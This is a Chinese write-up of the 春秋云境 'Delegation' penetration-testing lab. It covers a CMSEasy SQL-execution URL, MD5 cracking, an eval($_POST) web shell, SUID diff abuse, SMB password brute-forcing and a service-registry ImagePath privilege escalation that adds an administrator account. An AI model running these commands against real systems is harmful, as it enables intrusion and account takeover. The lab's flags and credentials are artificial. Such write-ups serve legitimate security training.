---
typora-root-url: 春秋云境Delegation
title: 春秋云境Delegation
toc: true
categories:
  - 渗透测试
date: 2026-03-08 22:15:08
tags: 
  - 渗透测试
---

# 春秋云境Delegation

fsan扫

```
E:\Users\tiand>fscan  -h 39.98.124.53
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.1

[796ms]     已选择服务扫描模式
[796ms]     开始信息扫描
[797ms]     最终有效主机数量: 1
[797ms]     开始主机扫描
[797ms]     使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle
[797ms]     有效端口数量: 233
[886ms] [*] 端口开放 39.98.124.53:80
[961ms] [*] 端口开放 39.98.124.53:21
[961ms] [*] 端口开放 39.98.124.53:3306
[961ms] [*] 端口开放 39.98.124.53:22
[3.8s]     扫描完成, 发现 4 个开放端口
[3.8s]     存活端口数量: 4
[3.8s]     开始漏洞扫描
[3.8s]     POC加载完成: 总共387个，成功387个，失败0个
[4.2s] [*] 网站标题 http://39.98.124.53       状态码:200 长度:68104  标题:中文网页标题
```

80端口有个cmseasy

## 入口点

![image-20260308200339209](image-20260308200339209.png)

```
http://39.98.124.53/?case=crossall&act=execsql&sql=Ud-ZGLMFKBOhqavNJNK5WRCu9igJtYN1rVCO8hMFRM8NIKe6qmhRfWexXUiOqRN4aCe9aUie4Rtw5

{"userid":"1","username":"admin","password":"e10adc3949ba59abbe56e057f20f883e","nickname":"\u7ba1\u7406\u5458","groupid":"2","checked":"1","qqlogin":"","alipaylogin":"","wechatlogin":"","avatar":"","userip":"","state":"0","qq":"1111","e_mail":"admin@admin.com","address":"admin","tel":"admin","question":"","answer":"","intro":"","point":"0","introducer":"0","regtime":"0","sex":"","isblock":"0","isdelete":"0","headimage":"\/html\/upload\/images\/201907\/15625455867367.png","integration":"0","couponidnum":"17:0:1","collect":"2,4,3,46,14,73","menoy":"100.07","adddatetime":"2021-09-01 00:00:00","notifiid":"","templatelang":"cn","adminlang":"cn","buyarchive":"","adminlangdomain":"","templatelangdomain":"","expired_time":"0"}

└─$ echo 'e10adc3949ba59abbe56e057f20f883e'>hash
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 512/512 AVX512BW 16x3])
Warning: no OpenMP support for this hash type, consider --fork=16
Press 'q' or Ctrl-C to abort, almost any other key for status
123456           (?)
1g 0:00:00:00 DONE (2026-03-08 20:06) 100.0g/s 76800p/s 76800c/s 76800C/s 123456..james1
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

拿到密码123456

http://39.98.124.53/index.php?case=user&act=login登录成功

![image-20260308213007832](image-20260308213007832.png)

phpinfo()改成eval($_POST[1])

蚁剑连接http://39.98.124.53/lang/cn/system_custom.php 密码：1

```
(www-data:/var/www/html/lang/cn) $ find / -name flag* 2>/dev/null
/usr/src/linux-headers-5.4.0-113/scripts/coccinelle/locks/flags.cocci
/usr/src/linux-headers-5.4.0-26-generic/include/config/arch/uses/high/vma/flags.h
/usr/src/linux-headers-5.4.0-113-generic/include/config/arch/uses/high/vma/flags.h
/usr/src/linux-headers-5.4.0-26/scripts/coccinelle/locks/flags.cocci
/home/flag
/home/flag/flag01.txt
(www-data:/var/www/html/lang/cn) $ ls -al /home/flag/flag01.txt
-r-------- 1 root root 798 Mar  8 21:22 /home/flag/flag01.txt
(www-data:/var/www/html/lang/cn) $ find / -perm -u=s 2>/dev/null
/usr/bin/stapbpf
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/staprun
/usr/bin/at
/usr/bin/diff
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/passwd
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
(www-data:/var/www/html/lang/cn) $ ls -al /usr/bin/diff
-rwsr-xr-x 1 root root 219480 Apr  8  2019 /usr/bin/diff
www-data:/var/www/html/lang/cn) $ diff /home/flag/flag01.txt /sys/devices/pnp0/00:04/tty/ttyS0/flags
1,15c1
<   ____  U _____ u  _     U _____ u   ____      _       _____             U  ___ u  _   _     
<  |  _"\ \| ___"|/ |"|    \| ___"|/U /"___|uU  /"\  u  |_ " _|     ___     \/"_ \/ | \ |"|    
< /| | | | |  _|" U | | u   |  _|"  \| |  _ / \/ _ \/     | |      |_"_|    | | | |<|  \| |>   
< U| |_| |\| |___  \| |/__  | |___   | |_| |  / ___ \    /| |\      | | .-,_| |_| |U| |\  |u   
<  |____/ u|_____|  |_____| |_____|   \____| /_/   \_\  u |_|U    U/| |\u\_)-\___/  |_| \_|    
<   |||_   <<   >>  //  \\  <<   >>   _)(|_   \\    >>  _// \\_.-,_|___|_,-.  \\    ||   \\,-. 
<  (__)_) (__) (__)(_")("_)(__) (__) (__)__) (__)  (__)(__) (__)\_)-' '-(_/  (__)   (_")  (_/  
< 
< flag01: flag{bab30806-1224-45eb-82b6-101778ebf0ee}
< 
< Great job!!!!!!
< 
< Here is the hint: WIN19\Adrian
< 
< I'll do whatever I can to rock you...
---
> 0x10000040
```

fscan扫内网，挂代理

```
(www-data:/var/www/html/lang/cn) $ ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:16:3e:24:69:ba brd ff:ff:ff:ff:ff:ff
    inet 172.22.4.36/16 brd 172.22.255.255 scope global dynamic eth0
       valid_lft 1892159088sec preferred_lft 1892159088sec
    inet6 fe80::216:3eff:fe24:69ba/64 scope link 
       valid_lft forever preferred_lft forever
(www-data:/var/www/html/lang/cn) $ chmod +x fscan 
(www-data:/var/www/html/lang/cn) $ ./fscan -h 172.22.4.36/24
(www-data:/var/www/html/lang/cn) $ cat res*
172.22.4.7:445 open
172.22.4.19:445 open
172.22.4.45:445 open
172.22.4.7:139 open
172.22.4.19:139 open
172.22.4.45:139 open
172.22.4.19:135 open
172.22.4.7:135 open
172.22.4.45:135 open
172.22.4.45:80 open
172.22.4.36:80 open
172.22.4.36:22 open
172.22.4.36:21 open
172.22.4.7:88 open
172.22.4.36:3306 open
[*] NetInfo 
[*]172.22.4.19
   [->]FILESERVER
   [->]172.22.4.19
[*] NetInfo 
[*]172.22.4.45
   [->]WIN19
   [->]172.22.4.45
[*] NetInfo 
[*]172.22.4.7
   [->]DC01
   [->]172.22.4.7
[*] NetBios 172.22.4.45     XIAORANG\WIN19                
[*] NetBios 172.22.4.19     FILESERVER.xiaorang.lab             Windows Server 2016 Standard 14393
[*] OsInfo 172.22.4.7    (Windows Server 2016 Datacenter 14393)
[*] NetBios 172.22.4.7      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393
[*] WebTitle http://172.22.4.36        code:200 len:68100  title:中文网页标题
[*] WebTitle http://172.22.4.45        code:200 len:703    title:IIS Windows Server

172.22.4.36（入口点）
172.22.4.45（IIS-WIN19）
172.22.4.19（FILESERVER）
172.22.4.7（DC）
```

## SMB爆破

提示里WIN19\Adrian，rockyou爆破试试

```
└─$ proxychains crackmapexec smb  172.22.4.45 -d WIN19 -u Adrian -p /usr/share/wordlists/rockyou.txt 2>/dev/null
ProxyChains-3.1 (http://proxychains.sf.net)
SMB         172.22.4.45     445    WIN19            [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19) (domain:WIN19) (signing:False) (SMBv1:False)
SMB         172.22.4.45     445    WIN19            [-] WIN19\Adrian:123456 STATUS_LOGON_FAILURE
SMB         172.22.4.45     445    WIN19            [-] WIN19\Adrian:12345 STATUS_LOGON_FAILURE
SMB         172.22.4.45     445    WIN19            [-] WIN19\Adrian:123456789 STATUS_LOGON_FAILURE
SMB         172.22.4.45     445    WIN19            [-] WIN19\Adrian:password STATUS_LOGON_FAILURE
SMB         172.22.4.45     445    WIN19            [-] WIN19\Adrian:iloveyou STATUS_LOGON_FAILURE
SMB         172.22.4.45     445    WIN19            [-] WIN19\Adrian:princess STATUS_LOGON_FAILURE
SMB         172.22.4.45     445    WIN19            [-] WIN19\Adrian:1234567 STATUS_LOGON_FAILURE
SMB         172.22.4.45     445    WIN19            [-] WIN19\Adrian:rockyou STATUS_LOGON_FAILURE
SMB         172.22.4.45     445    WIN19            [-] WIN19\Adrian:babygirl1 STATUS_PASSWORD_EXPIRED
```

babygirl1密码过期，改密码

smbpasswd改密码失败不知道为啥，只能改域的smb的吗

kali的rdesktop去连可以改密码

```
proxychains rdesktop 172.22.4.45
```

改为admin@123，rdp

普通用户（非管理员组），不是域用户，SharpHound收集不了信息，基本横向不了

想办法提权

普通非服务账户一般通过注册表去提权

PrivescCheck扫

```
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"

| TEST | SERVICES > Registry Permissions                | VULN |
+------+------------------------------------------------+------+
| DESC | Parse the registry and check whether the current user |
|      | can modify the configuration of any registered        |
|      | service.                                              |
+------+-------------------------------------------------------+
[*] Found 3 result(s).


Name              : gupdate
ImagePath         : "C:\Program Files (x86)\Google\Update\GoogleUpdate.exe" /svc
User              : LocalSystem
ModifiablePath    : HKLM\SYSTEM\CurrentControlSet\Services\gupdate
IdentityReference : NT AUTHORITY\Authenticated Users
Permissions       : WriteDAC, Notify, ReadControl, CreateLink, EnumerateSubKeys, WriteOwner, Delete, CreateSubKey, SetV
                    alue, QueryValue
Status            : Stopped
UserCanStart      : True
UserCanStop       : True

Name              : gupdate
ImagePath         : "C:\Program Files (x86)\Google\Update\GoogleUpdate.exe" /svc
User              : LocalSystem
ModifiablePath    : HKLM\SYSTEM\CurrentControlSet\Services\gupdate
IdentityReference : BUILTIN\Users
Permissions       : WriteDAC, Notify, ReadControl, CreateLink, EnumerateSubKeys, WriteOwner, Delete, CreateSubKey, SetV
                    alue, QueryValue
Status            : Stopped
UserCanStart      : True
UserCanStop       : True

Name              : Spooler
ImagePath         : C:\Windows\System32\spoolsv.exe
User              : LocalSystem
ModifiablePath    : HKLM\SYSTEM\CurrentControlSet\Services\Spooler
IdentityReference : NT AUTHORITY\Authenticated Users
Permissions       : ReadControl, EnumerateSubKeys, WriteOwner, CreateSubKey, QueryValue
Status            : Running
UserCanStart      : False
UserCanStop       : False
```

在HKLM\SYSTEM\CurrentControlSet\Services\gupdate的ImagePath改为

```
cmd.exe /c net user hacker admin@123 /add & net localgroup administrators hacker /add
```

相当于

```
reg add "HKLM\SYSTEM\CurrentControlSet\Services\gupdate" /v ImagePath /t REG_EXPAND_SZ /d "cmd.exe /c net user hacker admin@123 /add & net localgroup administrators hacker /add" /f
```

rdp上去，以管理员身份运行cmd

```
C:\Windows\system32>dir c:\ /S /B |findstr flag
c:\Users\Administrator\flag
c:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\flag.lnk
c:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\flag02.txt.lnk
c:\Users\Administrator\flag\flag02.txt

C:\Windows\system32>type c:\Users\Administrator\flag\flag02.txt
 ________  _______   ___       _______   ________  ________  _________  ___  ________  ________
|\   ___ \|\  ___ \ |\  \     |\  ___ \ |\   ____\|\   __  \|\___   ___\\  \|\   __  \|\   ___  \
\ \  \_|\ \ \   __/|\ \  \    \ \   __/|\ \  \___|\ \  \|\  \|___ \  \_\ \  \ \  \|\  \ \  \\ \  \
 \ \  \ \\ \ \  \_|/_\ \  \    \ \  \_|/_\ \  \  __\ \   __  \   \ \  \ \ \  \ \  \\\  \ \  \\ \  \
  \ \  \_\\ \ \  \_|\ \ \  \____\ \  \_|\ \ \  \|\  \ \  \ \  \   \ \  \ \ \  \ \  \\\  \ \  \\ \  \
   \ \_______\ \_______\ \_______\ \_______\ \_______\ \__\ \__\   \ \__\ \ \__\ \_______\ \__\\ \__\
    \|_______|\|_______|\|_______|\|_______|\|_______|\|__|\|__|    \|__|  \|__|\|_______|\|__| \|__|


flag02: flag{2799f3a0-5b09-4964-9b9a-79a8abc6891d}

```
